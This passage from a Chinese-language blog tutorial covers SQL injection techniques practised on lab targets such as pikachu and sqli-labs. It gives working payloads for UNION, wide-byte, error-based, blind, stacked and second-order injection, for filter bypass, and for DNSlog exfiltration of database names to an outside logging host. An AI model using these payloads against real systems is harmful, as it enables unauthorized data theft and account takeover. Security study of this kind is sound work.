plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d&#x27; UNION SELECT 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;pikachu&#x27;#</span><br></pre></td></tr></table></figure><h3 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h3><ol><li>根据我们的目标，假设对表member感兴趣，获取所有列名</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d&#x27; UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;pikachu&#x27; and table_name=&#x27;member&#x27;#</span><br></pre></td></tr></table></figure><h3 id="查询所需字段值"><a href="#查询所需字段值" class="headerlink" title="查询所需字段值"></a>查询所需字段值</h3><ol><li>有了username就可以通过他给的表单获取对应email，所以就假设我们对phone、address更感兴趣，0x3a是冒号</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d&#x27; UNION SELECT 1,group_concat(username,0x3a,phonenum,0x3a,address) from member#</span><br></pre></td></tr></table></figure><h2 id="偏移量注入"><a href="#偏移量注入" class="headerlink" title="偏移量注入"></a>偏移量注入</h2><ol><li>使用情况：当联合查询时知道表名，不知道该表的有多少列和他的列名的情况下，用到偏移量注入</li><li>前提条件：前面<code>selset</code>语句的查询列数要比后面<code>union select</code>中查询列数多。因为后面<code>union select</code>语句才是我们自己补上的注入语句，可以修改（增加其查询列数）；而前面的<code>select</code>语句我们是不能修改的，当前面的列数不足时，我们没有办法增加前面<code>select</code>语句的查询列数</li></ol><h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><ol><li><code>SELECT 1, 2, 3</code>的作用<ol><li><strong>生成固定列的数据</strong>：这个语句直接返回了一个包含三列的结果集，每列的值分别是1、2、3。这种用法在需要生成一个固定结构的数据集时很有用，比如在调试、测试或者构造一个特定的查询结果时。</li><li><strong>用于子查询或临时表</strong>：这个语句的结果集可以作为子查询或临时表的一部分，用于与其他表或查询结果进行联合查询、比较等操作。例如，在<code>IN</code>子句中使用，或者与<code>UNION</code>、<code>JOIN</code>等操作符结合使用。</li></ol></li><li>在使用<code>union</code>注入且前后列数不同时，正常来说会报错，此时我们在列数较少的<code>select</code>语句中增加查询<code>1,2,3 ……</code>，通过1，2，3……补齐列数，保证<code>union</code>语句正常运行，产生的临时表中补齐的列中的数据就是1或2或3……和另外一个表中的对应列的数据的结合体。<strong>注意</strong>：当<code>select * from 表名 …… </code>的前面select需要补齐时，<code>*</code>在最前面时可以保持不变，在其他位置时应写成<code>表名.*</code>，即：<code>select …… union select *,1,2,3 from users</code>和<code>select …… union select 1,2,users.*,3 from users</code>，不然会报错。</li></ol><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><ol><li>注入语句：<code>d&#39; union select *,1,2,3 from users#</code>，使用时<code>users</code>改为具体的表名</li><li>通过更改<code>*</code>的位置，得到不同的回显，得到想要的信息。</li><li><strong>注意</strong>：由于网页回显列数可能只回显表的部分列数，可能无法查出注入语句查询的表中的所有列的数据。<ol><li>假设输出原<code>select</code>语句中查询表的第二列和最后一列</li><li><code>d&#39; union select *,1,2,3 from users#</code>：回显users表中的第二列数据和数字3</li><li><code>d&#39; union select 1,users.*,2,3 from users#</code>：回显users表中的第一列数据和数字3</li><li><code>d&#39; union select 1,2,users.*,3 from users#</code>：回显数字2和数字3</li><li><code>d&#39; union select 1,2,3,users.* from users#</code>：回显数字2和users表中的最后一列数据（一般表中最后一列数据是level，即在表中的行数）</li><li>所以此次注入查询只查到了users表的第一列、第二列和最后一列，如果users表有三列以上，则无法查询玩users表中的所有数据</li></ol></li></ol><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>宽字节注入仅限于后台使用的是GBK编码，即项目是GBK编码。</p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><ol><li>GBK编码：支持中文，一个中文两字节（两个16进制数）</li><li>utf8：一个中文三字节，但不能使用宽字节注入，因为没有中文对应的以0x5c为最末位的三字节编号。所以无法拼接合并</li><li>宽字节注入仅限于后台源码设置为GBK编码时<code>$set = &quot;set character_set_client=gbk&quot;;</code></li><li>数据库为防止sql注入，通过转义函数将注入语句中的引号闭合符转义（尤其是php网站）使之意义失效，最终无法和命令中的引号闭合，导致注入失败。<ol><li>eg：<code>select id, email from member where username=&#39;d \&#39; or 1=1#&#39;</code>，其中因为注入语句中的引号被转义无法闭合，所以此命令真实读入的<code>username</code>是<code>d \&#39; or 1=1#</code></li><li>转义函数有<code>addslashes</code>和<code>mysql_real_escape_string</code>，他们转义的字符是单引号、双引号、反斜线和NULL空字符，转义的方式就是在这些符号前面自动加上<code>\</code>，让这些符号的意义失效。</li></ol></li></ol><h2 id="注入语句"><a href="#注入语句" class="headerlink" title="注入语句"></a>注入语句</h2><ol><li>即在正常的注入语句前面加一个%df(url)：<code>d%df&#39; or 1=1#</code>（在burpsuit转包中的url中拼接）</li></ol><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ol><li>宽字节注入原理：当后台源码通过转义函数来保护数据库时，在单引号前面多加一个16进制数，使之和转义字符<code>\</code>的16进制数0x5c拼接起来，变成GBK中对应的一个中文汉字，相当于通过拼接一个16进制数，将转义字符消去，拼接合并成另一个中文字符。一般是在前面加一个0xdf，即可和0x5c拼接成一个中文汉字，即df5c——運</li><li>实现过程：<ol><li>在url中注入<code>xx%df&#39; or 1=1#</code>。（图中是该语句的url编码）<img src="/../%E5%9B%BE%E7%89%87/sql%E6%B3%A8%E5%85%A5.assets/image-20240719161908250-1721657749289-5.png" alt="image-20240719161908250"></li><li>拼接到命令上：<code>select id, email from member where username=&#39;xx0xdf0x27+or+10x3d10x23&#39;</code></li><li>转义：<code>select id, email from member where username=&#39;xx0xdf\0x27+or+10x3d10x23&#39;</code>，即<code>select id, email from member where username=&#39;xx0xdf0x5c0x27+or+10x3d10x23&#39;</code></li><li>GBK编码：<code>select id, email from member where username=&#39;d 運&#39; or 1=1#&#39;</code></li><li>单引号闭合，成功注入。</li></ol></li></ol><h1 id="error注入攻击（报错注入）"><a href="#error注入攻击（报错注入）" class="headerlink" title="error注入攻击（报错注入）"></a>error注入攻击（报错注入）</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>后台没有屏蔽数据库报错信息，在语法发生错误时会输出在前端，并且错误信息里面可能会包含库名、表名等相关信息。</p><h2 id="获取报错信息的函数（常用）"><a href="#获取报错信息的函数（常用）" class="headerlink" title="获取报错信息的函数（常用）"></a>获取报错信息的函数（常用）</h2><h3 id="Updatexml"><a href="#Updatexml" class="headerlink" title="Updatexml()"></a>Updatexml()</h3><ol><li><p><code>Updatexml()</code>：是mysql对xml文档数据进行查询和修改的xpath函数，是一个内容替换函数，主要针对xml数据</p></li><li><p>sql使用方法：<code>UPDATEXML(XML_document, Xpath_string, new_value);</code></p><ol><li><p>第一个参数：<code>XML_document</code>是string格式，为xml文档对象的名称</p></li><li><p>第二个参数：<code>Xpath_string</code>（xpath格式的字符串），和正则类似</p></li><li><p>第三个参数：<code>new_value</code>，string格式，替换XML_document中xpath匹配符合条件的数据</p></li><li><p>作用，将<code>XML_document</code>内容通过<code>Xpath__string</code>匹配，匹配到的内容替换成<code>new_value</code>。<img src="/2025/03/01/sql%E6%B3%A8%E5%85%A5/../图片/sql注入.assets/image-20240717114151906.png" alt="image-20240717114151906" style="zoom:60%;"></p></li></ol></li></ol><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><ol><li><code>extractvalue()</code>：是mysql对xml文档数据进行查询的xpath函数</li><li>sql使用方法：<code>EXTRACTVALUE(XML_document,Xpath_tring);</code><ol><li>第一个参数：<code>XML_document</code>是string格式，是XML文档对象的名称</li><li>第二个参数：Xpath_string是xpath格式字符串，用于匹配XML_document文件中的内容。</li></ol></li></ol><h3 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h3><ol><li><code>floor()</code>：mysql中用来取整（向下取整，只取整数部分）的函数</li><li>sql使用方法：</li></ol><h2 id="注入语句-1"><a href="#注入语句-1" class="headerlink" title="注入语句"></a>注入语句</h2><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h3><ol><li><p>一般结构：<code>updatexml(1,concat(0x7e,(sql),0x7e),1)</code></p></li><li><p><code>1&#39; or updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) #</code></p><ol><li>可以是<code>or</code>也可以是<code>and</code>，根据情况自己选择</li><li>括号内的语句先执行，相当于先查询版本号，得到的拼接语句作为<code>updatexml</code>第二个参数，不符合xpath语法，对该内容报错。因为sql报错时会将错误内容返回，所以借助报错将版本号等敏感信息暴露出来。</li><li>因为updatexml语句第二个参数已经错了，所以前后两个参数无所谓都是随便写的1。</li><li>用cancat语句拼接查询的信息，因为一些特殊符号可能导致查询的数据信息显示不全（数据库将之当成多个数据），通过concat语句拼接就能使查询的信息完整显示。</li><li>0x7e是 <strong>~</strong> 符号的16进制，写入0x7e的目的是为了避免concat语句中只有一个参数报错。0x7e可以改，任意符号皆可。为什么不用 <strong>~</strong> ，是因为在concat中 <strong>~</strong> 要加引号，在注入时发生引号冲突。</li><li>示例中，最终的报错语句中会是：<code>……~5.5.53~……</code>，如果不加concat，则会只显示<code>.53</code></li></ol></li><li><p>如果要查询数据库名称：<code>1&#39; or updatexml(1,concat(0x7e,database(),0x7e),1) #</code>（直接调用内置函数不需要用括号括住，也可以外加一个括号，不影响）</p></li><li><p>爆出数据库及相关信息（登录用户和数据库根目录路劲）：<code>1&#39; and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,(select @@datadir)),1)#</code></p></li><li><p>爆当前数据库表信息：<code>1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name SEPARATOR 0x7e) from information_schema.tables where table_schema=database()),0x7e),1) #</code></p><ol><li>5.1及以上的mysql版本，mysql数据库中会存在一个叫做information_schema的默认数据库，这个库里面记录着整个mysql管理的数据库的名称、表明、列名（字段名）。<ol><li>其中<code>information_schema.tables</code>（即information_schema数据库中的tables表）存放了数据库中的所有表名</li><li>table_schema指的是数据库的名称。它用于标识数据库中的表所属的数据库。</li><li>在mysql中<code>table_name</code>通常指表名</li></ol></li><li>此处使用<code>group_concat()</code>函数进行输出，将所有表名通过 <strong>~</strong> 连接成一个字符串，所以此时不需要使用<code>LIMIT</code>限制</li><li><code>d&#39; and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)#</code>不用<code>group_concat</code>时，也可以用<code>limit</code>限制一下即可<ol><li><code>limit</code> 子句在这里的作用是确保子查询只返回一个表名，而不是所有表名。这在 SQL 注入攻击中非常有用，因为它可以控制返回的数据量，避免过多的数据导致查询失败或被检测到</li><li><code>limit a,n</code>：表示返回从a行开始的n行数据（第一行是0行）</li><li>通过枚举a的值来达到枚举出所有表名的作用。</li></ol></li></ol></li><li><p>爆user表字段信息：<code>1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),0x7e),1) #</code></p><ol><li><code>information_schema.columns</code>（即information_schema数据库中的columns表）存放了数据库中的所有字段名（列名）</li><li><code>column_name</code>是指的是字段名（列名）</li></ol></li><li><p>爆字段内容（字段值）：<code>1&#39; and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users limit 0,1),0x7e),1) #</code></p></li></ol><h3 id="extractvalue-1"><a href="#extractvalue-1" class="headerlink" title="extractvalue"></a>extractvalue</h3><ol><li>一般结构：<code>extractvalue(1,concat(0x7e,(sql),0x7e))</code></li></ol><h3 id="floor-1"><a href="#floor-1" class="headerlink" title="floor"></a>floor</h3><ol><li>一般结构：<code>Select count(*),concat(PAYLOAD,floor(rand(0)*2))x from 表名 group by x;</code></li><li>这条 SQL 语句的作用是利用 MySQL 的报错机制来进行 SQL 注入攻击。具体来说，它通过生成重复的键值来触发数据库的错误，从而将注入的有效载荷（<code>PAYLOAD</code>）包含在错误信息中。以下是每个部分的详细解释：<ol><li><strong><code>SELECT count(\*), concat(PAYLOAD, floor(rand(0)\*2)) x FROM 表名 GROUP BY x;</code></strong>：<ul><li><strong><code>count(\*)</code></strong>：统计表中所有记录的数量。</li><li><strong><code>concat(PAYLOAD, floor(rand(0)\*2)) x</code></strong>：将 <code>PAYLOAD</code> 与 <code>floor(rand(0)*2)</code> 的结果连接起来，并将其命名为 <code>x</code>。<code>floor(rand(0)*2)</code> 会生成一个伪随机数（0 或 1），因为 <code>rand(0)</code> 使用固定的种子值 0。</li><li><strong><code>GROUP BY x</code></strong>：根据 <code>x</code> 的值对结果进行分组。</li></ul></li><li><strong><code>floor(rand(0)\*2)</code></strong>：<ul><li><strong><code>rand(0)</code></strong>：生成一个伪随机数序列，因为使用了固定的种子值 0，每次生成的序列都是相同的。</li><li><strong><code>floor(rand(0)\*2)</code></strong>：将生成的伪随机数乘以 2 并取整，结果是 0 或 1。</li></ul></li><li><strong>报错机制</strong>：<ul><li>当 <code>GROUP BY</code> 操作遇到重复的键值时，会尝试将这些键值插入到一个临时表中。如果插入时发现键值已经存在，就会触发主键冲突错误（<code>Duplicate entry</code>）。</li><li>通过 <code>concat</code> 函数将 <code>PAYLOAD</code> 包含在生成的键值中，当触发错误时，<code>PAYLOAD</code> 会出现在错误信息中，从而实现信息泄露。</li></ul></li></ol></li></ol><h1 id="加密注入"><a href="#加密注入" class="headerlink" title="加密注入"></a>加密注入</h1><ol><li>前端提交的有些数据是加密后，到后台再解密，然后再进行数据库查询等相关操作的，所以对注入语句应当进行相同的加密操作，再进行注入。</li><li>注入流程：对加密数据解密—&gt;在解密的内容中注入payload—&gt;对修改后的内容加密—&gt;再将加密后的内容发送过去。</li><li>常用加密base64等，如果不知道是什么加密，则看前端代码（很大可能是js文件中），分析是什么加密</li></ol><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><ol><li><p>二次注入是一种数据库安全漏洞，它通常难以通过黑盒测试发现，而更多地依赖于代码审计。这种漏洞主要发生在程序代码中操作数据库数据的地方，特别是当从数据库中取出的数据未经脏数据过滤时。二次注入的原理在于，攻击者构造的恶意数据被存储在数据库中后，这些数据在后续被读取并直接用于构建SQL查询语句时，可能导致SQL注入攻击。</p></li><li><p>具体来说，即使防御者在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据被插入到数据库时，这些处理可能被还原，导致脏数据被存储在数据库中。当Web程序调用这些存储在数据库中的恶意数据并执行SQL查询时，就可能发生SQL二次注入。</p></li><li><p>以PHP代码为例，如果在第一次插入数据时，仅仅使用了<code>addslashes</code>或<code>get_magic_quotes_gpc</code>对特殊字符进行了转义，但在写入数据库时仍保留了原始数据（如单引号），这些数据就被视为脏数据。在后续查询过程中，如果直接从数据库中取出这些数据并用于构建SQL查询，而没有进行进一步的检验和处理，就可能形成二次注入。</p><p>因此，为了防止SQL二次注入，开发者需要确保在每次从数据库中取出数据并用于构建SQL查询时，都进行充分的验证和过滤，确保数据的安全性。</p></li><li><p>二次注入分为两步：</p><ol><li>第一步：插入恶意数据。进行数据库插入数据时，对其中的特殊字符进行转义处理，在写入数据库的时候又保留了原来的数据</li><li>第二步：引入恶意数据。开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验处理</li></ol></li><li><p>二次注入通常用在注册、评论区留言等数据库会留存输入信息的场景。</p></li><li><p>注入示例（sqli-labs lesson 24——登录场景）：</p><ol><li>选择注册用户（假设已知管理员用户名为：admin，或其他人的用户名）<ol><li>注册的用户名是注入语句：<code>admin&#39;#</code></li><li>密码随便写：123</li><li>因为有防护将引号等特殊字符进行了转义处理，所以此时注册的账户是用户名：admin’#，密码：123，注入语句并未发生作用。但此时这条注入语句被存入了数据库中。</li></ol></li><li>返回登录页面，登录此账户，选择修改密码。<ol><li>原密码：123</li><li>新密码：666，再次确认输入666</li><li>选择确认。重置密码后，会发现用户名：admin’#的密码还是123；但是用户名：admin的密码变成了666</li><li>因为在修改密码的时候，只需要重新输入密码，而用户名是数据库内部直接调用匹配的。此时没有对数据库中的内容进行防护（特殊字符转义）而是直接调用，因此用户名就成功的成为注入语句注入到修改密码的SQL语句中。因为在匹配查询时，username在password前面导致password被注释掉（所以原密码输入不影响结果），所以查询时只需要满足username&#x3D;admin即可。所以能成功修改管理员账户密码![屏幕截图 2024-07-21 120934](..&#x2F;图片&#x2F;sql注入.assets&#x2F;屏幕截图 2024-07-21 120934.png)</li></ol></li></ol></li></ol><h1 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h1><ol><li><p>静态、动态、伪静态网站是什么：</p><ol><li><p>静态网站是指网站的内容是固定的，不会根据用户的请求和交互进行实时更新和变化的网站。这类网站通常由一系列的静态HTML页面组成，每个页面都包含固定的内容和布局。当用户访问静态网站时，服务器会直接将相应的HTML页面发送给用户的浏览器进行显示。静态网站的内容更新通常需要手动编辑HTML文件并重新上传到服务器上。静态网站url有一个特点：其url地址结尾是<code>.html</code>或<code>.htm</code></p></li><li><p>动态网站是指网站的内容可以根据用户的请求和交互进行实时更新和变化的网站。这类网站通常依赖于后端服务器和数据库来存储和管理网站内容。当用户访问动态网站时，服务器会根据用户的请求动态地生成HTML页面，并将其发送给用户的浏览器进行显示。动态网站可以实现复杂的功能和交互，如用户登录、在线购物、内容管理系统等。</p></li><li><p>伪静态网站是指使用动态网页技术生成的网址，但在表现形式上看起来像静态网站。这种技术通过服务器端程序对页面地址进行重写处理，实现对动态网站的访问，呈现对应的静态页面效果。然而，实质上的内容仍然是动态生成的，只是URL结构被改写成静态形式。这种网站相对动态网站而言更安全，更不易被攻击。伪静态网站有个特点：虽然和静态网站一样地址结尾是<code>.html</code>或<code>.htm</code>，但是其地址中通常会有一些数字作为id（或其他标志），然后通过id值去访问动态php文件或其他动态文件，和数据库进行交互。</p></li><li><p>如果找到了伪静态网站其网址的动态url，同样可以通过其访问该网站，所以也可以对其动态网址进行注入。</p><blockquote><p>动态链接:</p><ul><li><code>http://192.168.0.26/pikachu/vul/sqli/sqli_str.phpname=vince&amp;submit=%E6%9F%A5%E8%AF%A2</code></li><li><code>https://search.jd.com/search?keyword=%E6%89%8B%E6%9C%BA&amp;wq=%E6%89%8B%9C%BA&amp;ev=5_122671%5E</code></li></ul><p>静态链接:</p><ul><li><code>http://127.0.0.1:8000/jaden/index.html</code></li><li><code>http://127.0.0.1:8000/jaden/person.html</code></li></ul><p>伪静态链接:</p><ul><li><code>http://127.0.0.1:8000/jaden/1/wei_news.html</code></li><li><code>http://127.0.0.1:8000/jaden/news/1.html</code></li></ul><p>同一个网站的连接：</p><ul><li><p>动态访问链接:<code>http://192.168.61.149/forum.php?mod=viewthread&amp;tid=1&amp;extra=page%3D1</code></p></li><li><p>伪静态访问链接:<code>http://192.168.61.149/thread-1-1-1.html</code></p></li><li><p>伪静态访问链接（包含SQL注入尝试）:<code>http://192.168.61.149/thread-1-1&#39;or 1=1#-1.html</code></p></li><li><p>伪静态转动态配置规则（非直接URL，但包含URL重写逻辑）:</p></li></ul><p><code>rewrite ^([^\.])/thread-([0-9]+)-([0-9]+)([0-9]+)\.html$ $1/forum.php?mod=viewthread&amp;tid=$2&amp;extra=page%3D$4&amp;page=$3 last;</code></p><ul><li>伪静态网址中的三个1分别对应动态网址中三个参数tid、extra、page的值</li></ul></blockquote></li></ol></li><li><p>注入语句：直接在伪静态网址的数字后面注入，数字和字符型payload都可以尝试。如果配置规则的正则表达式写的不好，那么就会将注入语句匹配进去，成功注入到动态url中。</p></li></ol><h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><ol><li>无回显：页面没有响应或者没有变化或直接转到404等</li><li>有些网站的防护手段就是通过无回显来实现的。如：限制响应数据只能是一条，超过一条则无回显，此时即使注入成功，也无回显；检测到注入语句，不返回报错信息（无回显）</li><li>无回显有两种情况：一种是：没有注入点；另一种是：有注入点，注入成功了，但响应时限制了，无回显。</li><li>盲注分为两大类：<ol><li>基于布尔型的盲注</li><li>基于时间型的盲注</li></ol></li><li>因为手工盲注是很费时费力的，所以一般使用工具进行盲注</li><li>前提条件，已知一个查询信息。</li></ol><h2 id="Boolean（布尔）注入攻击"><a href="#Boolean（布尔）注入攻击" class="headerlink" title="Boolean（布尔）注入攻击"></a>Boolean（布尔）注入攻击</h2><ol><li>原理：通过不断注入<code>已知信息&#39; and 判断语句#</code>，通过判断语句尝试，正确则判断中的信息是正确的；否则，反之。如果正常响应查询内容，则说明判断语句是正确的，知道猜测的信息是正确的。如果不响应或响应错误，则猜测信息是错误的，继续猜测。</li><li>注入语句（假设已知用户名vince）：<ol><li>猜测数据库名的长度：<code>vince&#39; and length(database())=7#</code></li><li>猜测数据库名的字符：<code>vince&#39; and ascii(substr(database(),1,1))=112#</code>或<code>vince&#39; and ascii(substr(database(),1,1))&gt;112#</code></li><li>函数解析：<ol><li><code>substr(字符串,a,n)</code>：提取字符串从a位置开始的n个字符（第一个字符是位置1）</li><li><code>ascii(字符)</code>：将字符转化为对应的ascii值</li></ol></li><li>如果响应出该用户的信息，则猜测正确；如果响应不存在该用户（判断语句错误，因为是and连接，所以是相当于用户名输入错误），则猜测错误。重复猜测知道猜测这正确</li></ol></li><li>可以通过注入语句猜测出库名、表名、列名、字段名等信息</li></ol><h2 id="Time（时间）注入攻击"><a href="#Time（时间）注入攻击" class="headerlink" title="Time（时间）注入攻击"></a>Time（时间）注入攻击</h2><ol><li>当正常输入无回显，普通注入、报错注入、布尔盲注都无法生效始终无回显时，可以尝试时间盲注。</li><li>通过sleep函数判断是否有注入点。注入语句（已知用户名vince）：<code>vince&#39; and sleep(5)</code><ol><li>sleep函数：<code>sleep(a)</code>延迟a秒响应</li><li>如果比正常输入响应慢了许多，说明此处有注入点</li></ol></li><li>原理：通过响应是否延迟判断if语句中的判断是否正确，和布尔类似，只不过是通过响应时间作为判断标准</li><li>注入语句（假设已知用户名vince）：<ol><li>猜测数据库名的长度：<code>vince&#39; and if(length(database()=7),sleep(3),1)#</code></li><li>猜测数据库名的字符：<code>vince&#39; and if(ascii(substr(database(),1,1))=112,sleep(3),1)#</code>或<code>vince&#39; and if(ascii(substr(database(),1,1))&gt;112,sleep(3),1)#</code></li><li>if语句：<code>if(判断语句,语句1,语句2)</code>。判断语句正确，执行语句1；判断语句错误，执行语句2。</li><li>因为页面本来就无回显，所以if中的语句2可以是<code>1</code>也可以是其他</li><li>如果sleep函数被防御了，也可以通过benchmark函数实现延迟效果。<ol><li><code>benchmark(n,语句1)</code>：语句1执行n次</li><li>注入语句：<code>vince&#39; and if(length(database()=7),benchmark(1000000000,md5(1)),1)#</code></li></ol></li><li><code>sleep</code>、<code>benchmark</code>等函数被禁：因为mysql不区分大小写，所以可以通过修改函数字母的大小写来绕过防护，如：<code>sLeeP</code>、<code>BencHmaRk</code>等</li></ol></li></ol><h1 id="Stack注入攻击"><a href="#Stack注入攻击" class="headerlink" title="Stack注入攻击"></a>Stack注入攻击</h1><ol><li>需要后台代码是可以执行多条sql语句的，php中是使用PDO方式执行多条语句。堆叠注入攻击可以执行多条语句，多语句之间以分号隔开。利用这个特点可以在后面的语句中构造自己要执行的语句。</li><li>堆叠注入的使用条件十分有限，一旦能被使用，将对数据安全造成重大威胁。因为其可以执行任何语句，甚至可以删除整个数据库</li><li>堆叠注入只能返回第一条查询信息，不返回后面的信息。因此，堆叠注入第二个及以后的语句产生的错误或结果都无法看到（无回显）。所以在读取数据的时候，建议使用union联合注入。同时在使用堆叠注入之前，也是需要知道一些数据库相关的信息的，例如表名、列名等信息。</li><li>获取数据库、表（单引号闭合）</li><li>限制：堆叠注入的局限性在于并不是每个环境下都可以执行，可能受到API（即PHP中传输并执行sql命令的函数）或数据库引擎不支持的限制</li><li>mysql在有些API支付堆叠注入；sqlserver都支持堆叠注入；oracle不支持堆叠注入</li></ol><h1 id="DNSlog注入方式"><a href="#DNSlog注入方式" class="headerlink" title="DNSlog注入方式"></a>DNSlog注入方式</h1><ol><li><p>当盲注也无法使用且没有回显时，我们用DNSlog注入</p></li><li><p>提供DNSlog日志记录的网址的网站</p><blockquote><ul><li><a href="http://ceye.io/">http://ceye.io/</a></li><li><a href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></li></ul></blockquote></li><li><p>原理：通过注入语句使数据库访问（发出包含数据库信息的访问请求）具备DNSlog日志记录功能的网站，通过网站的日志记录功能将数据库的访问请求记录下来。</p></li><li><p>使用前提：</p><ol><li>需要mysql用户具备读文件的权限，因为需要借助到mysql的load_file读取文件的函数。如果权限不够，不能调用该函数。其实只要mysql章配置项中开启了secure_file_priv配置，就可以通过sql语句来执行文件读取操作</li><li>mysql数据库服务器要能够访问外网。因为在注入时，其实使用的是load_file函数对诸如<code>\\www.jaden.com</code>这样的url发送请求，这样的url我们称为UNC路径。</li></ol></li><li><p>注入语句：</p><ol><li>从网站获取具有DNSlog日志记录的网址（假设是：<code>9fqiop.ceye.io</code>）</li><li>获得数据库名称：<code>d&#39; and (select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.9fqiop.ceye.io\\abc&#39;)))</code>或<code>d&#39; and (select load_file(concat(&#39;//&#39;,(select database()),&#39;.9fqiop.ceye.io/abc&#39;)))</code><ol><li>用concat语句将数据库信息和网址拼接起来作为请求发送过去，连接符号是<code>.</code></li><li><code>\</code>和<code>/</code>都可以，只不过是<code>\</code>时，每个<code>\</code>的前面要多添加一个<code>\</code>作为转义字符将<code>\</code>转义成普通文本而不是作为特殊字符</li></ol></li><li>获取表名：<code>d&#39; and (select load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&#39;.9fqiop.ceye.io\\abc&#39;)))</code><ol><li>通过修改limit后面的数字即可查出所有表名</li></ol></li><li>获取字段名：<code>d&#39; and (select load_file(concat(&#39;\\\\&#39;,(select column_name from information_schema.columns where table_schema=database() and table_name=&#39;member&#39; limit 0,1),&#39;.9fqiop.ceye.io\\abc&#39;)))</code><ol><li>通过修改limit后面的数字即可查出所有字段名</li></ol></li></ol></li></ol><h1 id="中转注入"><a href="#中转注入" class="headerlink" title="中转注入"></a>中转注入</h1><ol><li>隐藏地址</li><li>对注入语句统一加工</li></ol><h1 id="前端代码防御和绕过"><a href="#前端代码防御和绕过" class="headerlink" title="前端代码防御和绕过"></a>前端代码防御和绕过</h1><ol><li>网页前端的防护手段一般是：js格式校验和对数据进行js加密。</li><li>js格式校验：当提交数据不符合该处提交格式时，数据在前端就会被js代码阻止，都不会发送到后台数据库。所以首先我们要输入符合格式的数据，再用burp抓包，此时便可随便修改数据，添加注入语句</li><li>js加密：在网页前端代码发送请求给后台数据库时，其一般会对发送数据进行加密操作。我们只能通过阅读网页前端的js文件，找出其加密手段，才能进行注入语句拼接。同时为保护前端js文件，通常会对js文件进行混淆和压缩。此时我们需要掌握<strong>js加解密</strong>和<strong>js逆向</strong>才能解决</li></ol><h1 id="后台代码防御和绕过"><a href="#后台代码防御和绕过" class="headerlink" title="后台代码防御和绕过"></a>后台代码防御和绕过</h1><blockquote><p><code>$uname  = $_GET(&#39;username&#39;);</code></p><p>情况一：判断关键字<br>    <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">if</span>（<span class="string">&#x27;select&#x27;</span> in <span class="variable">$uname</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;不要搞事情&#x27;</span></span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure></p><p>情况二：替换关键字<br>将<code>select * from users</code>中的<code>select</code>替换为空字符串<br><code>echostr_replace(&quot;select&quot;,&quot;&quot;,&quot;select * from users&quot;);</code></p><p>情况三：直接强行将用户提交的id数据转换为整型</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="variable">$id</span> =<span class="variable">$_POST</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line">&gt;<span class="variable">$id_int</span> =<span class="title function_ invoke__">intval</span>(<span class="variable">$id</span>);</span><br><span class="line">&gt;select * <span class="keyword">from</span> users where id=<span class="variable">$id_int</span></span><br></pre></td></tr></table></figure><p>情况四：魔术符号，将用户提交的数据中的引号自动在前面加上\进行转义<br><code>magic_quotes_gpc=on</code><br>或者使用了<code>adds1ashes($id)</code></p></blockquote><ol><li>情况一绕过：大小写绕过：<code>SELECT * FROM USERS；</code></li><li>*情况二绕过：双写：<code>selselectect* * from users;</code>，其实st_replace只替换了一次select还剩下一个select</li><li>情况三：强防御，这种的很难绕过了，因为我们写的注入语句都是字符串，针对提交数据为纯数字的时候，这种防御就很难绕过了，但是好多时候，用户正常向后台提交的数据都是非数字类型的，这样的话就不会进行intval的加工，就可以尝试其他注入手法。</li><li>情况四：开启了魔术符号转义功能，这种的参看我们前面说的宽字节注入，其他方法很难绕过，但是这里有个点，就是如果对id&#x3D;1这种数字型的注入，还是有其他办法的，比如<code>id=1 and select * from users;</code>这样没有单引号的注入语句。</li></ol><h1 id="读取服务器敏感文件数据"><a href="#读取服务器敏感文件数据" class="headerlink" 